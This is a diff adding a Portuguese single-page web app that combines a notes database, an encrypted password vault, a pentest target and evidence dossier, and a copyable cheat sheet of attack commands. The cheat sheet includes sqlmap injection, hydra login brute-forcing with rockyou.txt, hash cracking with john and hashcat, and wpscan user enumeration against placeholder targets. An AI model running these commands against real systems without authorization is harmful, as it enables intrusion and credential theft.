+ instalar:[['Atualizar','sudo apt update && sudo apt upgrade -y'],['Ferramentas','sudo apt install -y nmap hydra sqlmap john sublist3r amass gobuster whatweb wpscan curl wget dnsutils']]
+};
+function mods(m){
+  $('modsout').innerHTML='<b style="color:var(--red)">'+m.toUpperCase()+'</b>'+
+    (MODS[m]||[]).map(([d,c])=>'<div class="cblock"><div class="d">'+esc(d)+'</div><span class="c">'+esc(c)+'</span> <button class="mini" data-copy="'+esc(c)+'">COPIAR</button></div>').join('')+
+    '<div style="color:var(--muted);font-size:9px;margin-top:4px">Substitua os placeholders. Apenas com autorização.</div>';
+}
+$('modsout').onclick=e=>{const b=e.target.closest('[data-copy]');if(b)copyText(b.dataset.copy);};
+
+/* TARGETS / EV / DOSSIÊ */
+function addTgt(){const v=$('tgt').value.trim();if(!v)return;
+  $('tgts').innerHTML+='<div style="border:1px solid #ffaaaa;background:#fff8f8;padding:2px 5px;margin:2px 0">🎯 '+esc(v)+'</div>';
+  $('tgt').value='';flash('Target adicionado');}
+function addEv(){const u=$('urlbar').value;$('evs').innerHTML+='<div style="padding:2px 0">📸 '+esc(u)+'</div>';flash('Evidência capturada');}
+function saveDos(){localStorage.setItem('lua_eclipse_dossier',$('notes').value);flash('Dossiê salvo');}
+function expDos(){let t='LUA DE SANGUE ECLIPSE — DOSSIÊ\n==\n'+new Date().toISOString()+'\n\nNOTAS\n'+($('notes').value||'—')+'\n\nTARGETS\n'+($('tgts').innerText||'—')+'\n\nEVIDÊNCIAS\n'+($('evs').innerText||'—')+'\n';
+  dl('dossie_lua_eclipse.txt',new Blob([t],{type:'text/plain'}));flash('TXT exportado');}
+function expCmds(){let t='LUA DE SANGUE ECLIPSE — COMANDOS\n==\n';
+  for(const[m,l]of Object.entries(MODS)){t+='\n'+m.toUpperCase()+'\n'+l.map(([d,c])=>d+'\n'+c).join('\n')+'\n';}
+  dl('comandos_lua_eclipse.txt',new Blob([t],{type:'text/plain'}));flash('TXT exportado');}
+
+/* ===== CRYPTO AES-GCM/PBKDF2 ===== */
+const subtle=window.crypto&&crypto.subtle?crypto.subtle:null;
+function b64(b){return btoa(String.fromCharCode(...new Uint8Array(b)));}
+function unb64(s){return Uint8Array.from(atob(s),c=>c.charCodeAt(0));}
+async function deriveKey(pw,saltBytes){
+  const km=await subtle.importKey('raw',new TextEncoder().encode(pw),'PBKDF2',false,['deriveKey']);
+  return subtle.deriveKey({name:'PBKDF2',salt:saltBytes,iterations:100000,hash:'SHA-256'},km,{name:'AES-GCM',length:256},false,['encrypt','decrypt']);
+}
+async function encA(plain,pw){const iv=crypto.getRandomValues(new Uint8Array(12)),salt=crypto.getRandomValues(new Uint8Array(16));
+  const k=await deriveKey(pw,salt),ct=await subtle.encrypt({name:'AES-GCM',iv},k,new TextEncoder().encode(plain));
+  return 'A1:'+b64(salt)+':'+b64(iv)+':'+b64(ct);}
+async function decA(p,pw){if(!p||!p.startsWith('A1:'))return p||'';
+  try{const[,s,i,c]=p.split(':'),k=await deriveKey(pw,unb64(s));
+    return new TextDecoder().decode(await subtle.decrypt({name:'AES-GCM',iv:unb64(i)},k,unb64(c)));}
+  catch(e){return '[ERRO AO DECIFRAR]';}}
+async function sha256(s){const b=await subtle.digest('SHA-256',new TextEncoder().encode(s));
+  return[...new Uint8Array(b)].map(x=>x.toString(16).padStart(2,'0')).join('');}
+
+/* ===== PERSISTÊNCIA ===== */
+const DBN='LUA_ECLIPSE_V2',ST='kv';let db=null;
+const openDB=()=>new Promise((res,rej)=>{const r=indexedDB.open(DBN,1);
+  r.onupgradeneeded=e=>e.target.result.createObjectStore(ST);
+  r.onsuccess=e=>{db=e.target.result;res();};r.onerror=()=>rej(r.error);});
+const kvSet=(k,v)=>new Promise((res,rej)=>{const t=db.transaction(ST,'readwrite');t.objectStore(ST).put(v,k);t.oncomplete=res;t.onerror=()=>rej(t.error);});
+const kvGet=k=>new Promise((res,rej)=>{const r=db.transaction(ST,'readonly').objectStore(ST).get(k);r.onsuccess=()=>res(r.result);r.onerror=()=>rej(r.error);});
+const S={entries:[],versions:[],vault:[],master:null};let MASTER=null;
+
+async function saveAll(){await kvSet('entries',S.entries);await kvSet('versions',S.versions);await kvSet('vault',S.vault);await kvSet('master',S.master);}
+async function loadAll(){await openDB();
+  S.entries=(await kvGet('entries'))||[];S.versions=(await kvGet('versions'))||[];
+  S.vault=(await kvGet('vault'))||[];S.master=(await kvGet('master'))||null;}
+
+/* ===== BANCO ===== */
+function updType(){const m=['image','audio','video','file'].includes($('fType').value);
+  $('wFile').classList.toggle('hidden',!m);$('wContent').classList.toggle('hidden',m);}
+let CUR='green';
+$('colorRow').onclick=e=>{const b=e.target.closest('button');if(!b)return;
+  document.querySelectorAll('#colorRow button').forEach(x=>x.classList.remove('sel'));
+  b.classList.add('sel');CUR=b.dataset.c;};
+function showForm(){$('form').classList.remove('hidden');$('form').scrollIntoView({behavior:'smooth'});}
+function hideForm(){$('form').classList.add('hidden');
+  ['fTitle','fContent','fTags','fPass','fFile'].forEach(i=>$(i).value='');}
+async function addEntry(){
+  const title=$('fTitle').value.trim();if(!title){flash('Informe o título');return;}
+  const type=$('fType').value;
+  const en={id:uid(),title,type,tags:$('fTags').value.split(',').map(t=>t.trim()).filter(Boolean),
+    color:CUR,ts:new Date().toISOString(),content:'',data:null,fileName:null,size:null,locked:null};
+  if(['image','audio','video','file'].includes(type)){
+    const f=$('fFile').files[0];if(!f){flash('Selecione o arquivo');return;}
+    if(f.size>20*1024*1024){flash('Máx 20MB');return;}
+    en.data=await new Promise(r=>{const fr=new FileReader();fr.onload=()=>r(fr.result);fr.readAsDataURL(f);});
+    en.fileName=f.name;en.size=f.size;
+  }else{
+    en.content=$('fContent').value;
+    if(type==='link'&&en.content&&!/^https?:\/\//i.test(en.content)){flash('Link deve começar com http(s)://');return;}
+  }
+  const pw=$('fPass').value.trim();
+  if(pw){const salt=[...crypto.getRandomValues(new Uint8Array(8))].join('');
+    en.locked={salt,hash:await sha256(pw+'::'+salt)};}
+  S.entries.unshift(en);await saveAll();renderCards();hideForm();flash('Entrada adicionada!');
+}
+function renderCards(){
+  const box=$('cards');
+  if(!S.entries.length){box.innerHTML='<div style="text-align:center;padding:30px;color:var(--muted)">[ BANCO VAZIO ]</div>';return;}
+  box.innerHTML=S.entries.map(e=>{
+    const c=e.color||'green',vc=S.versions.filter(v=>v.entryId===e.id).length;
+    let body='';
+    if(e.locked&&!e.__open){body='<div class="locked">🔒 RESTRITO<br><small>Protegido por senha</small><br><button class="mini" data-act="unlock" data-id="'+e.id+'">INSERIR SENHA</button></div>';}
+    else if(e.type==='link'){const ok=/^https?:\/\//i.test(e.content||'');
+      body=ok?'<a href="'+esc(e.content)+'" target="_blank" rel="noopener">'+esc(e.content)+'</a>':'<span style="color:var(--redd)">⚠ URL bloqueada</span> '+esc(e.content);}
+    else if(e.type==='image'&&e.data){body='<img src="'+e.data+'" alt="">';}
+    else if(['audio','video'].includes(e.type)&&e.data){
+      body=e.type==='audio'?'<audio controls src="'+e.data+'" style="width:100%"></audio>':'<video controls src="'+e.data+'" style="max-width:100%;max-height:250px"></video>';}
+    else if(e.type==='file'&&e.data){body='<a href="'+e.data+'" download="'+esc(e.fileName||'arquivo')+'">⬇ '+esc(e.fileName||'arquivo')+'</a> ('+((e.size||0)/1024).toFixed(1)+' KB)';}
+    else body=esc(e.content||'');
+    const tags=(e.tags||[]).map(t=>'<span class="tag">#'+esc(t)+'</span>').join('');
+    return '<div class="card" style="border-left-color:'+(COLORS[c]||'#1d7f3b')+'">'+
+      '<div class="t">'+esc(e.title)+' <span class="badge" style="background:'+(COLORS[c]||'#1d7f3b')+'">'+(LABELS[c]||'SEGURO')+'</span>'+(e.locked?' 🔒':'')+'</div>'+
+      '<div class="m">'+fmt(e.ts)+' · versões: '+vc+'</div>'+
+      '<div class="b">'+body+'</div>'+(tags?'<div style="margin-top:5px">'+tags+'</div>':'')+
+      '<div class="a">'+
+      (e.type==='text'&&!e.locked?'<button class="mini" data-act="copy" data-id="'+e.id+'">📋 COPIAR TEXTO</button>':'')+
+      '<button class="mini" data-act="edit" data-id="'+e.id+'">✏ EDITAR</button>'+
+      '<button class="mini" data-act="hist" data-id="'+e.id+'">📜 VERSÕES</button>'+
+      '<button class="mini" data-act="del" data-id="'+e.id+'">🗑 EXCLUIR</button></div></div>';
+  }).join('');
+}
+$('cards').onclick=async e=>{
+  const b=e.target.closest('button');if(!b)return;
+  const en=S.entries.find(x=>x.id===b.dataset.id);if(!en)return;
+  const a=b.dataset.act;
+  if(a==='copy')copyText(en.content||'');
+  else if(a==='del'){if(!confirm('Excluir "'+en.title+'"?'))return;
+    S.entries=S.entries.filter(x=>x.id!==en.id);await saveAll();renderCards();flash('Excluída');}
+  else if(a==='edit'){
+    if(en.locked&&!en.__open){const p=prompt('Senha da entrada:');if(p===null)return;
+      if(await sha256(p+'::'+en.locked.salt)!==en.locked.hash){flash('Senha incorreta');return;}}
+    const nt=prompt('Novo título:',en.title);if(nt===null)return;
+    const nc=prompt('Novo conteúdo:',en.content||'');if(nc===null)return;
+    S.versions.unshift({id:uid(),entryId:en.id,ts:new Date().toISOString(),title:en.title,content:en.content,note:'edição automática'});
+    en.title=nt.trim()||en.title;en.content=nc;
+    await saveAll();renderCards();flash('Editada — versão anterior em 📜');}
+  else if(a==='unlock'){const p=prompt('Senha da entrada:');if(p===null)return;
+    if(await sha256(p+'::'+en.locked.salt)===en.locked.hash){en.__open=true;renderCards();flash('Desbloqueada');}
+    else flash('Senha incorreta');}
+  else if(a==='hist'){renderVers(en.id);document.querySelector('[data-t="ver"]').click();}
+};
+
+/* ===== VERSÕES ===== */
+function renderVers(filterId){
+  const list=S.versions.filter(v=>!filterId||v.entryId===filterId);
+  const box=$('verlist');
+  if(!list.length){box.innerHTML='<div style="text-align:center;padding:20px;color:var(--muted)">[ Nenhuma versão ]</div>';return;}
+  box.innerHTML=list.map(v=>'<div class="vrow"><div><b>'+esc(v.title)+'</b><br><span style="color:var(--muted);font-size:10px">'+fmt(v.ts)+' · '+esc(v.note||'')+'</span></div>'+
+    '<div style="display:flex;gap:5px"><button class="mini" data-v="view" data-id="'+v.id+'">👁 VER</button>'+
+    (v.entryId&&S.entries.some(x=>x.id===v.entryId)?'<button class="mini" data-v="rest" data-id="'+v.id+'">⤺ RESTAURAR</button>':'')+'</div></div>').join('');
+}
+let curVer=null;
+$('verlist').onclick=e=>{const b=e.target.closest('button');if(!b)return;
+  const v=S.versions.find(x=>x.id===b.dataset.id);if(!v)return;
+  if(b.dataset.v==='view'){curVer=v;
+    $('verT').textContent='Versão de '+fmt(v.ts);
+    $('verB').textContent=(v.content||v.title||'').slice(0,20000);
+    $('mVer').classList.add('on');}
+  else restoreVer(v);
+};
+function restoreVer(v){
+  const en=S.entries.find(x=>x.id===v.entryId);if(!en)return;
+  S.versions.unshift({id:uid(),entryId:en.id,ts:new Date().toISOString(),title:en.title,content:en.content,note:'backup antes de restaurar'});
+  en.title=v.title;en.content=v.content;
+  saveAll().then(()=>{renderCards();closeModal('mVer');flash('⤺ Versão restaurada!');});
+}
+$('verRestore').onclick=()=>curVer&&restoreVer(curVer);
+function closeModal(id){$(id).classList.remove('on');}
+
+/* ===== COFRE ===== */
+function vaultLocked(){return S.master&&!MASTER;}
+function renderVault(){
+  const box=$('pwdList');
+  $('vinfo').innerHTML='Cofre: <b>'+S.vault.length+'</b> senha(s) · Mestra: '+
+    (S.master?'<b style="color:var(--redd)">definida</b>':'não definida')+' · Sessão: '+
+    (MASTER?'<b style="color:#1d7f3b">autenticada</b>':'<b style="color:var(--redd)">bloqueada</b>');
+  if(!S.vault.length){box.innerHTML='<div style="text-align:center;padding:20px;color:var(--muted)">[ COFRE VAZIO ]</div>';return;}
+  if(vaultLocked()){box.innerHTML='<div class="locked">🔐 COFRE BLOQUEADO<br><small>Autentique-se com a senha mestra</small></div>';return;}
+  box.innerHTML=S.vault.map(v=>'<div class="card pwd"><div class="t">🔑 '+esc(v.title)+'</div>'+
+    '<div class="m">👤 '+esc(v.user||'—')+' · '+fmt(v.ts)+'</div>'+
+    (v.notes?'<div style="font-size:11px;color:var(--muted)">'+esc(v.notes)+'</div>':'')+
+    '<div class="a"><button class="mini" data-p="show" data-id="'+v.id+'">👁 REVELAR</button>'+
+    '<button class="mini" data-p="copy" data-id="'+v.id+'">📋 COPIAR</button>'+
+    '<button class="mini" data-p="del" data-id="'+v.id+'">✕ EXCLUIR</button></div></div>').join('');
+}
+async function unlockVault(){
+  if(!S.master){flash('Defina a mestra primeiro');return;}
+  const p=prompt('Senha mestra:');if(p===null)return;
+  const probe=await decA(S.master.check,p);
+  if(probe==='OK'){MASTER=p;renderVault();flash('Cofre desbloqueado');}
+  else flash('Mestra incorreta');
+}
+async function setMaster(){
+  const p=$('master').value;if(!p||p.length<8){flash('Mínimo 8 caracteres');return;}
+  S.master={check:await encA('OK',p)};MASTER=p;await saveAll();
+  $('master').value='';renderVault();flash('✅ Mestra definida');
+}
+function showPwdForm(){
+  if(!S.master){flash('Defina a senha mestra antes');return;}
+  if(vaultLocked()){unlockVault();return;}
+  $('pwdForm').classList.remove('hidden');}
+function hidePwdForm(){$('pwdForm').classList.add('hidden');['pTitle','pUser','pPass','pNotes'].forEach(i=>$(i).value='');}
+async function savePwd(){
+  const t=$('pTitle').value.trim(),p=$('pPass').value;
+  if(!t||!p){flash('Serviço e senha obrigatórios');return;}
+  S.vault.unshift({id:uid(),title:t,user:$('pUser').value.trim(),enc:await encA(p,MASTER),notes:$('pNotes').value,ts:new Date().toISOString()});
+  await saveAll();renderVault();hidePwdForm();flash('Senha cifrada e salva');}
+$('pwdList').onclick=async e=>{
+  const b=e.target.closest('button');if(!b)return;
+  const v=S.vault.find(x=>x.id===b.dataset.id);if(!v)return;
+  if(b.dataset.p==='del'){if(!confirm('Excluir do cofre?'))return;
+    S.vault=S.vault.filter(x=>x.id!==v.id);await saveAll();renderVault();return;}
+  const p=prompt('Senha mestra:');if(p===null)return;
+  const plain=await decA(v.enc,p);
+  if(plain.startsWith('[ERRO')){flash('Mestra incorreta');return;}
+  if(b.dataset.p==='show')alert('Senha: '+plain);else copyText(plain);};
+
+/* ===== KALI ===== */
+const KALI=[['nmap','Network scanner','nmap -sV -sC -T4 --top-ports 1000 <TARGET>'],
+ ['sqlmap','SQL injection','sqlmap -u "http://TARGET/page?id=1" --batch --dbs'],
+ ['ffuf','Fuzzer web','ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302,307,401,403,405 -ac -t 40 -of html -o resultado.html'],
+ ['gobuster','Dir brute-force','gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt'],
+ ['amass','OSINT subdomínios','amass enum -d TARGET'],['nikto','Web vuln scanner','nikto -h http://TARGET'],
+ ['hydra','Brute-force login','hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:F=failed"'],
+ ['john','Quebra de hash','john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt'],
+ ['hashcat','Quebra de hash (GPU)','hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt'],
+ ['wpscan','WordPress','wpscan --url http://TARGET --enumerate u,ap,at'],
+ ['searchsploit','Base de exploits','searchsploit "nginx 1.18"']];
+function renderKali(){$('klist').innerHTML=KALI.map(([n,d,c])=>'<div class="kcmd" data-k="'+esc(c)+'"><b>'+esc(n)+'</b> — '+esc(d)+'<small>$ '+esc(c)+'</small></div>').join('');}
+$('klist').onclick=e=>{const k=e.target.closest('.kcmd');if(k)copyText(k.dataset.k);};
+
+/* ===== BACKUP ===== */
+function doExport(){
+  const data={app:'LUA DE SANGUE ECLIPSE AXIOM CARLOS ACUTIS',version:2,exportedAt:new Date().toISOString(),
+    entries:S.entries,versions:S.versions,vault:S.vault,master:S.master,notes:$('notes').value};
+  dl('lua-eclipse-backup-'+Date.now()+'.json',new Blob([JSON.stringify(data,null,1)],{type:'application/json'}));
+  flash('Backup exportado');}
+function pickFile(inp,cb){const f=$(inp).files[0];if(!f){flash('Escolha o arquivo');return;}
+  f.text().then(t=>{const d=JSON.parse(t);if(!Array.isArray(d.entries))throw new Error('formato inválido');cb(d);})
+  .catch(e=>flash('Erro: '+e.message));}
+function doImport(){pickFile('impFile',async d=>{
+  S.entries=d.entries;S.versions=d.versions||[];S.vault=d.vault||[];S.master=d.master||null;MASTER=null;
+  if(d.notes!=null)$('notes').value=d.notes;
+  await saveAll();renderCards();renderVault();flash('Importado!');});}
+function doMerge(){pickFile('mrgFile',async d=>{
+  const ids=new Set(S.entries.map(e=>e.id));let n=0;
+  d.entries.forEach(e=>{if(!ids.has(e.id)){S.entries.push(e);ids.add(e.id);n++;}});
+  const vids=new Set(S.vault.map(v=>v.id));
+  (d.vault||[]).forEach(v=>{if(!vids.has(v.id)){S.vault.push(v);vids.add(v.id);}});
+  await saveAll();renderCards();renderVault();flash('Mesclado: +'+n);});}
+function snapshot(){
+  S.versions.unshift({id:uid(),entryId:null,ts:new Date().toISOString(),
+    title:'📷 SNAPSHOT COMPLETO — '+S.entries.length+' entradas',content:JSON.stringify(S.entries,null,1),note:'snapshot manual do banco'});
+  saveAll().then(()=>{flash('Snapshot criado — veja em 📜 VERSÕES');});}
+function wipe(){if(!confirm('APAGAR TUDO? Irreversível.'))return;
+  if(!confirm('Certeza absoluta? Exporte antes!'))return;
+  S.entries=[];S.versions=[];S.vault=[];S.master=null;MASTER=null;
+  saveAll().then(()=>{renderCards();renderVault();flash('Dados apagados');});}
+function dbgExec(){
+  const c=$('dbgIn').value.trim().toLowerCase(),o=$('dbg');let out='';
+  if(c==='help')out='Comandos: stats | entries | vault | clear';
+  else if(c==='stats')out='Entradas: '+S.entries.length+'\nVersões: '+S.versions.length+'\nCofre: '+S.vault.length+'\nMestra: '+(S.master?'sim':'não');
+  else if(c==='entries')out=S.entries.map(e=>e.id+' | '+e.type+' | '+e.title).join('\n')||'[vazio]';
+  else if(c==='vault')out=S.vault.map(v=>v.id+' | '+v.title).join('\n')||'[vazio]';
+  else if(c==='clear')o.textContent='[ AXIOM ] limpo';
+  else out='Desconhecido. Digite help.';
+  if(c!=='clear')o.textContent+='\n$ '+c+'\n'+out;
+  $('dbgIn').value='';}
+$('dbgIn').addEventListener('keydown',e=>{if(e.key==='Enter')dbgExec();});
+
+/* ===== INIT ===== */
+(async()=>{
+  try{await loadAll();renderCards();renderVault();renderVers();
+    $('notes').value=localStorage.getItem('lua_eclipse_dossier')||'';
+    console.log('%c🌑 LUA DE SANGUE ECLIPSE AXIOM CARLOS ACUTIS — online','color:#c41e3a;font-weight:bold');
+  }catch(e){flash('Erro ao iniciar: '+e.message);console.error(e);}
+})();
+window.addEventListener('beforeunload',()=>localStorage.setItem('lua_eclipse_dossier',$('notes').value));
+</script>
+</body>
+</html>
